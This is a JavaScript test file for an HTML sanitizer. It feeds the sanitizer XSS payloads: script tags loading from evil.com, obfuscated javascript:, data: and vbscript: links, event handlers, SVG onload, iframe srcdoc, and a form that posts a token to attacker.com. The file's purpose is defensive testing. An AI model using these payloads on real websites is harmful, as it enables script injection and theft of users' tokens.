import test from 'node:test'
import assert from 'node:assert/strict'
import { createRequire } from 'node:module'
import { sanitizeHtml, sanitizeUrl, setDOMParser } from './sanitize.mjs'

const require = createRequire(import.meta.url)
const { parseHTML } = require('linkedom')

// Setup DOMParser for Node test environment
setDOMParser((html) => {
  return parseHTML(`<!DOCTYPE html><html><body>${html}</body></html>`).document
})

test('Sanitizer: removes script tags completely', () => {
  const input = '<div>Hello <script>alert("XSS")</script>World</div>'
  const output = sanitizeHtml(input)
  assert.equal(output.includes('script'), false)
  assert.equal(output.includes('alert'), false)
  assert.equal(output.includes('Hello'), true)
  assert.equal(output.includes('World'), true)
})

test('Sanitizer: removes case-insensitive and malformed script tags', () => {
  const input = '<p>Test<SCRIPT SRC="https://evil.com/xss.js"></SCRIPT></p>'
  const output = sanitizeHtml(input)
  assert.equal(output.includes('evil.com'), false)
  assert.equal(output.includes('SCRIPT'), false)
})

test('Sanitizer: blocks javascript: URLs with case variation, newlines and tabs', () => {
  const cases = [
    '<a href="javascript:alert(1)">click1</a>',
    '<a href="JaVaScRiPt:alert(1)">click2</a>',
    '<a href="java\nscript:alert(1)">click3</a>',
    '<a href="java\tscript:alert(1)">click4</a>',
    '<a href="java\0script:alert(1)">click5</a>',
    '<a href="  javascript:alert(1)  ">click6</a>'
  ]
  for (const c of cases) {
    const output = sanitizeHtml(c)
    assert.equal(output.includes('javascript:'), false, `Failed on case: ${c}`)
    assert.equal(output.includes('href'), false, `Href should be stripped for: ${c}`)
  }
})

test('Sanitizer: blocks data: and vbscript: protocols', () => {
  const input1 = '<a href="data:text/html,<script>alert(1)</script>">data link</a>'
  const input2 = '<a href="vbscript:msgbox(1)">vb link</a>'
  assert.equal(sanitizeHtml(input1).includes('data:'), false)
  assert.equal(sanitizeHtml(input2).includes('vbscript:'), false)
})

test('Sanitizer: removes event handlers (on*) and style attributes', () => {
  const input = '<div id="test" onclick="alert(1)" onmouseover="evil()" style="color:red; background:url(javascript:alert(1))">content</div>'
  const output = sanitizeHtml(input)
  assert.equal(output.includes('onclick'), false)
  assert.equal(output.includes('onmouseover'), false)
  assert.equal(output.includes('style'), false)
  assert.equal(output.includes('alert'), false)
  assert.equal(output.includes('content'), true)
})

test('Sanitizer: drops SVG, MathML, iframe, srcdoc and form elements', () => {
  const input = `
    <div>
      <svg onload="alert(1)"><circle r="10"/></svg>
      <iframe srcdoc="&lt;script&gt;alert(1)&lt;/script&gt;"></iframe>
      <form action="https://attacker.com/steal"><input name="token" value="123"><button>Go</button></form>
      <math><mi>x</mi></math>
    </div>
  `
  const output = sanitizeHtml(input)
  assert.equal(output.includes('svg'), false)
  assert.equal(output.includes('iframe'), false)
  assert.equal(output.includes('form'), false)
  assert.equal(output.includes('math'), false)
  assert.equal(output.includes('attacker.com'), false)
})

test('Sanitizer: blocks remote image tracking pixels', () => {
  const input = '<p>Badge: <img src="https://tracker.com/pixel.gif" alt="Tracking Beacon" onerror="alert(1)"></p>'
  const output = sanitizeHtml(input)
  assert.equal(output.includes('<img'), false)
  assert.equal(output.includes('tracker.com'), false)
  assert.equal(output.includes('onerror'), false)
  assert.equal(output.includes('[图片: Tracking Beacon]'), true)
})

test('Sanitizer: resolves relative links against baseUrl and secures links', () => {
  const baseUrl = 'https://raw.githubusercontent.com/owner/repo/v1.0.0/'
  const input = '<a href="docs/install.md">Install Guide</a><a href="#section">Section</a>'
  const output = sanitizeHtml(input, { baseUrl })
  assert.equal(output.includes('https://raw.githubusercontent.com/owner/repo/v1.0.0/docs/install.md'), true)
  assert.equal(output.includes('target="_blank"'), true)
  assert.equal(output.includes('rel="noopener noreferrer"'), true)
  assert.equal(output.includes('href="#section"'), true)
})

test('Sanitizer: preserves legitimate markdown structures (code, table, lists, typography)', () => {
  const input = `
    <h1>Header 1</h1>
    <p>A paragraph with <strong>bold</strong>, <em>italic</em>, and <code>code</code>.</p>
    <pre><code class="language-javascript">const x = 1;</code></pre>
    <table>
      <thead><tr><th>Name</th><th>Value</th></tr></thead>
      <tbody><tr><td>A</td><td>1</td></tr></tbody>
    </table>
    <ul><li>Item 1</li><li>Item 2</li></ul>
    <blockquote>Quote</blockquote>
  `
  const output = sanitizeHtml(input)
  assert.equal(output.includes('<h1>Header 1</h1>'), true)
  assert.equal(output.includes('<strong>bold</strong>'), true)
  assert.equal(output.includes('language-javascript'), true)
  assert.equal(output.includes('<table>'), true)
  assert.equal(output.includes('<blockquote>Quote</blockquote>'), true)
})
